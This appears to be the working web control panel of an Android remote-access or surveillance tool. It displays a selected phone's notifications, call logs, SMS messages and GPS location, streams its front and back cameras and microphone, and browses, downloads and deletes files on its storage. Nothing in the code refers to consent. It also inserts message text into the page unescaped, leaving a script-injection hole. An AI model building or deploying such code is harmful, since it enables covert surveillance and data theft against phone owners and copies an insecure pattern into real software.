// Dynamic IP detection based on environment
function getServerURL() {
  const hostname = window.location.hostname;
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }
  return `http://${hostname}:3000`;
}

const socket = io(getServerURL(), {
  reconnection: true,
  reconnectionAttempts: 15,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  randomizationFactor: 0.5
});

const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const statusDiv = document.getElementById('status');
const notificationsDiv = document.getElementById('notifications');
const callLogsDiv = document.getElementById('callLogs');
const smsDiv = document.getElementById('smsMessages');
const debugLog = document.getElementById('debugLog');
const retryButton = document.getElementById('retryButton');
const clientSelector = document.getElementById('clientSelector');

let peer = null;
let myId = null;
let selectedAndroidClientId = null;
let connectedAndroidClients = [];
let map = null;
let marker = null;
let audioTrack = null;
let frontVideoTrack = null;
let backVideoTrack = null;

let activeDownloads = {};

const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
  logDebug(message);
  retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
}

function logDebug(message) {
  const logEntry = document.createElement('div');
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 50) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function updateClientSelector() {
  clientSelector.innerHTML = '';
  if (connectedAndroidClients.length === 0) {
    clientSelector.innerHTML = '<option value="">No devices connected</option>';
    return;
  }
  connectedAndroidClients.forEach(client => {
    const option = document.createElement('option');
    option.value = client.id;
    option.textContent = `Device ${client.id.substring(0, 8)} (${client.address})`;
    if (client.id === selectedAndroidClientId) {
      option.selected = true;
    }
    clientSelector.appendChild(option);
  });
}

function clearCurrentClientData() {
  notificationsDiv.innerHTML = '';
  callLogsDiv.innerHTML = '';
  smsDiv.innerHTML = '';
  videoFront.srcObject = null;
  videoBack.srcObject = null;
  audioTrack = null;
  frontVideoTrack = null;
  backVideoTrack = null;
  if (marker) {
    marker.remove();
    marker = null;
  }
  if (peer) {
    peer.close();
    peer = null;
  }
}

function addNotification(notification) {
  const notificationEl = document.createElement('div');
  notificationEl.className = 'notification';
  notificationEl.innerHTML = `
    <p><strong>App:</strong> ${notification.appName}</p>
    <p><strong>Title:</strong> ${notification.title}</p>
    <p><strong>Text:</strong> ${notification.text}</p>
    <p class="timestamp">${notification.timestamp}</p>
  `;
  notificationsDiv.prepend(notificationEl);
  while (notificationsDiv.children.length > 10) {
    notificationsDiv.removeChild(notificationsDiv.lastChild);
  }
  logDebug(`Received notification from ${notification.appName}`);
}

function addCallLog(call) {
  const callLogEl = document.createElement('div');
  callLogEl.className = 'call-log';
  callLogEl.innerHTML = `
    <p><strong>Number:</strong> ${call.number}</p>
    <p><strong>Type:</strong> ${call.type}</p>
    <p><strong>Date:</strong> ${call.date}</p>
    <p><strong>Duration:</strong> ${call.duration} seconds</p>
  `;
  callLogsDiv.prepend(callLogEl);
  while (callLogsDiv.children.length > 10) {
    callLogsDiv.removeChild(callLogsDiv.lastChild);
  }
  logDebug(`Received call log: ${call.number}`);
}

function addSmsMessage(sms) {
  const smsEl = document.createElement('div');
  smsEl.className = 'sms-message';
  smsEl.innerHTML = `
    <p><strong>Address:</strong> ${sms.address}</p>
    <p><strong>Type:</strong> ${sms.type}</p>
    <p><strong>Date:</strong> ${sms.date}</p>
    <p><strong>Body:</strong> ${sms.body}</p>
  `;
  smsDiv.prepend(smsEl);
  while (smsDiv.children.length > 50) {
    smsDiv.removeChild(smsDiv.lastChild);
  }
  logDebug(`Received SMS from ${sms.address}`);
}

function initMap() {
  map = L.map('mapContainer').setView([0, 0], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
}

function updateMap(latitude, longitude) {
  if (!map) {
    initMap();
  }
  if (marker) {
    marker.setLatLng([latitude, longitude]);
  } else {
    marker = L.marker([latitude, longitude]).addTo(map);
    marker.bindPopup('Device Location').openPopup();
  }
  map.setView([latitude, longitude], 13);
  logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
}

function updateStreams() {
  if (frontVideoTrack) {
    const frontStream = new MediaStream([frontVideoTrack]);
    if (audioTrack) frontStream.addTrack(audioTrack);
    videoFront.srcObject = frontStream;
    videoFront.onloadedmetadata = () => {
      videoFront.play().catch(err => {
        console.error('Autoplay blocked for front:', err);
        updateStatus('Tap the front video to start playback');
        videoFront.setAttribute('controls', 'true');
      });
    };
  }
  if (backVideoTrack) {
    const backStream = new MediaStream([backVideoTrack]);
    if (audioTrack) backStream.addTrack(audioTrack);
    videoBack.srcObject = backStream;
    videoBack.onloadedmetadata = () => {
      videoBack.play().catch(err => {
        console.error('Autoplay blocked for back:', err);
        updateStatus('Tap the back video to start playback');
        videoBack.setAttribute('controls', 'true');
      });
    };
  }
  updateStatus('Receiving remote streams');
}

function reconnectSocket() {
  updateStatus('Attempting to reconnect to server...');
  socket.connect();
}

clientSelector.addEventListener('change', (e) => {
  const newClientId = e.target.value;
  if (newClientId === selectedAndroidClientId) return;
  selectedAndroidClientId = newClientId;
  clearCurrentClientData();
  if (newClientId) {
    logDebug(`Selected device: ${newClientId}`);
    socket.emit('web-client-ready', myId);
  }
});

socket.on('connect', () => {
  updateStatus('Connected to signaling server');
});

socket.on('connect_error', (error) => {
  const message = `Socket.IO connection error: ${error.message} (${error.type})`;
  console.error(message);
  updateStatus('Failed to connect to server. Retrying...');
});

socket.on('id', id => {
  myId = id;
  logDebug(`Received socket ID: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
  updateStatus('Announced readiness to receive stream');
});

socket.on('android-clients-list', (clients) => {
  logDebug(`Received ${clients.length} connected devices`);
  connectedAndroidClients = clients;
  updateClientSelector();
  if (connectedAndroidClients.length > 0 && !selectedAndroidClientId) {
    selectedAndroidClientId = connectedAndroidClients[0].id;
    updateClientSelector();
    logDebug(`Auto-selected device: ${selectedAndroidClientId}`);
  }
});

socket.on('android-client-connected', (clientInfo) => {
  logDebug(`New device connected: ${clientInfo.id} (${clientInfo.address})`);
  connectedAndroidClients.push(clientInfo);
  updateClientSelector();
  if (!selectedAndroidClientId) {
    selectedAndroidClientId = clientInfo.id;
    updateClientSelector();
  }
});

socket.on('android-client-disconnected', (id) => {
  logDebug(`Device disconnected: ${id}`);
  connectedAndroidClients = connectedAndroidClients.filter(c => c.id !== id);
  updateClientSelector();
  if (id === selectedAndroidClientId) {
    selectedAndroidClientId = connectedAndroidClients.length > 0 ? connectedAndroidClients[0].id : null;
    clearCurrentClientData();
    updateClientSelector();
  }
});

socket.on('notification', data => {
  if (data.from === selectedAndroidClientId) {
    logDebug(`Received notification from ${data.from}`);
    if (data.notification) {
      addNotification(data.notification);
    }
  }
});

socket.on('call-log', data => {
  if (data.from === selectedAndroidClientId) {
    logDebug(`Received call log from ${data.from}`);
    if (data.call_logs) {
      data.call_logs.forEach(call => addCallLog(call));
    }
  }
});

socket.on('sms', data => {
  if (data.from === selectedAndroidClientId) {
    logDebug(`Received SMS messages from ${data.from}`);
    if (data.sms_messages) {
      data.sms_messages.forEach(sms => addSmsMessage(sms));
    }
  }
});

socket.on('location', data => {
  if (data.from === selectedAndroidClientId) {
    logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
    updateMap(data.latitude, data.longitude);
  }
});

socket.on('signal', async (data) => {
  if (data.from !== selectedAndroidClientId) return;
  logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
  const { from, signal } = data;
  if (!peer) {
    logDebug('Creating new peer connection');
    try {
      peer = new RTCPeerConnection(config);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('audio', { direction: 'recvonly' });
      peer.ontrack = (event) => {
        const track = event.track;
        if (track.kind === 'audio') {
          audioTrack = track;
        } else if (track.kind === 'video' && track.id === 'front_camera') {
          frontVideoTrack = track;
        } else if (track.kind === 'video' && track.id === 'back_camera') {
          backVideoTrack = track;
        }
        updateStreams();
      };
      peer.onicecandidate = e => {
        if (e.candidate) {
          logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };
      peer.oniceconnectionstatechange = () => {
        logDebug(`ICE connection state: ${peer.iceConnectionState}`);
        updateStatus(`ICE connection: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') {
          updateStatus('Connection failed, please refresh or retry');
        }
      };
      peer.onsignalingstatechange = () => {
        logDebug(`Signaling state: ${peer.signalingState}`);
      };
    } catch (err) {
      console.error('Failed to create peer connection:', err);
      updateStatus(`Peer connection error: ${err.message}`);
    }
  }
  try {
    if (signal.type === 'offer') {
      logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      logDebug(`Created answer, SDP: ${answer.sdp.substring(0, 50)}...`);
      await peer.setLocalDescription(answer);
      logDebug('Sending answer back to Android');
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal.candidate) {
      logDebug(`Adding ICE candidate: ${signal.candidate.candidate}`);
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Error handling signal:', err);
    updateStatus(`Error: ${err.message}`);
  }
});

socket.on('error', (error) => {
  console.error('Socket.IO server error:', error);
  updateStatus(`Server error: ${error.message}`);
});

retryButton.addEventListener('click', reconnectSocket);

const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');

let currentPath = "/storage/emulated/0/";

function requestFileList(path) {
  if (!selectedAndroidClientId) {
    updateStatus('No Android client selected');
    return;
  }
  updateStatus(`Requesting files for: ${path}`);
  socket.emit('fs:list', { to: selectedAndroidClientId, path: path });
}

function renderFileList(files, path) {
  if (path) {
    currentPath = path;
    fsPathInput.value = path;
  }
  fileListDiv.innerHTML = '';
  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px; text-align: center; margin-top: 20px;">This directory is empty.</div>';
    return;
  }
  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });
  files.forEach(file => {
    const item = document.createElement('div');
    item.style.cssText = 'display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #1f2937; cursor: pointer; transition: background 0.2s;';
    item.onmouseover = () => item.style.background = '#1f2937';
    item.onmouseout = () => item.style.background = 'transparent';
    const icon = document.createElement('span');
    icon.textContent = file.isDir ? '📁' : '📄';
    icon.style.marginRight = '10px';
    icon.style.fontSize = '1.2rem';
    const info = document.createElement('div');
    info.style.flex = '1';
    const name = document.createElement('div');
    name.textContent = file.name;
    name.style.color = file.isDir ? '#34d399' : '#d1d5db';
    name.style.fontWeight = file.isDir ? 'bold' : 'normal';
    const size = document.createElement('div');
    size.textContent = file.isDir ? 'Dir' : formatBytes(file.size);
    size.style.fontSize = '0.8rem';
    size.style.color = '#6b7280';
    info.appendChild(name);
    info.appendChild(size);
    const actions = document.createElement('div');
    if (!file.isDir) {
      const downloadBtn = document.createElement('button');
      downloadBtn.textContent = '⬇';
      downloadBtn.title = 'Download';
      downloadBtn.style.cssText = 'background: none; border: none; cursor: pointer; margin-right: 8px; font-size: 1.1rem;';
      downloadBtn.onclick = (e) => {
        e.stopPropagation();
        requestFileDownload(file.path);
      };
      actions.appendChild(downloadBtn);
    }
    const deleteBtn = document.createElement('button');
    deleteBtn.textContent = '🗑';
    deleteBtn.title = 'Delete';
    deleteBtn.style.cssText = 'background: none; border: none; cursor: pointer; font-size: 1.1rem;';
    deleteBtn.onclick = (e) => {
      e.stopPropagation();
      if (confirm(`Delete ${file.name}?`)) {
        deleteFile(file.path);
      }
    };
    actions.appendChild(deleteBtn);
    item.appendChild(icon);
    item.appendChild(info);
    item.appendChild(actions);
    if (file.isDir) {
      item.onclick = () => requestFileList(file.path);
    }
    fileListDiv.appendChild(item);
  });
}

function formatBytes(bytes, decimals = 2) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function requestFileDownload(path) {
  if (!selectedAndroidClientId) return;
  updateStatus(`Requesting download: ${path}`);
  socket.emit('fs:download', { to: selectedAndroidClientId, path: path });
}

function deleteFile(path) {
  if (!selectedAndroidClientId) return;
  updateStatus(`Deleting: ${path}`);
  socket.emit('fs:delete', { to: selectedAndroidClientId, path: path });
  setTimeout(() => requestFileList(currentPath), 1000);
}

fsGoBtn.addEventListener('click', () => requestFileList(fsPathInput.value));
fsBackBtn.addEventListener('click', () => {
  let path = currentPath;
  if (path.endsWith('/')) path = path.slice(0, -1);
  if (path === '') path = '/';
  const lastSlash = path.lastIndexOf('/');
  if (lastSlash !== -1) {
    const parent = path.substring(0, lastSlash + 1) || '/';
    requestFileList(parent);
  }
});

socket.on('fs:files', (data) => {
  if (data.to === myId || !data.to) {
    logDebug('Received file list');
    if (data.file_list) {
      renderFileList(data.file_list.files, data.file_list.currentPath);
    }
  }
});

socket.on('fs:download_start', (data) => {
  const { fileId, name, size, totalChunks } = data;
  logDebug(`[FS] Download start: ${name} (${totalChunks} chunks)`);
  activeDownloads[fileId] = {
    name: name,
    buffer: new Array(totalChunks),
    totalChunks: totalChunks,
    receivedChunks: 0,
    startTime: Date.now()
  };
  updateStatus(`Downloading ${name} (0%)`);
});

socket.on('fs:download_chunk', (data) => {
  const { fileId, chunkIndex, content } = data;
  const download = activeDownloads[fileId];
  if (download) {
    if (!download.buffer[chunkIndex]) {
      download.buffer[chunkIndex] = content;
      download.receivedChunks++;
    }
    const progress = Math.floor((download.receivedChunks / download.totalChunks) * 100);
    if (progress % 5 === 0) {
      updateStatus(`Downloading ${download.name} (${progress}%)`);
    }
  }
});

socket.on('fs:download_complete', (data) => {
  const { fileId } = data;
  const download = activeDownloads[fileId];
  if (download) {
    logDebug(`[FS] Download complete: ${download.name}`);
    updateStatus(`Processing ${download.name}...`);
    const base64Complete = download.buffer.join('');
    downloadBase64File(base64Complete, download.name);
    const duration = (Date.now() - download.startTime) / 1000;
    updateStatus(`Downloaded ${download.name} in ${duration}s`);
    delete activeDownloads[fileId];
  }
});

socket.on('fs:download_error', (data) => {
  const { fileId, error } = data;
  if (activeDownloads[fileId]) {
    const name = activeDownloads[fileId].name;
    updateStatus(`Download failed: ${name}`);
    logDebug(`[FS] Download error for ${name}: ${error}`);
    delete activeDownloads[fileId];
  }
});

function downloadBase64File(base64Data, fileName) {
  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
  const downloadLink = document.createElement("a");
  downloadLink.href = linkSource;
  downloadLink.download = fileName;
  downloadLink.click();
}

updateStatus('Connecting to server...');
logDebug('Web client initializing...');
initMap();
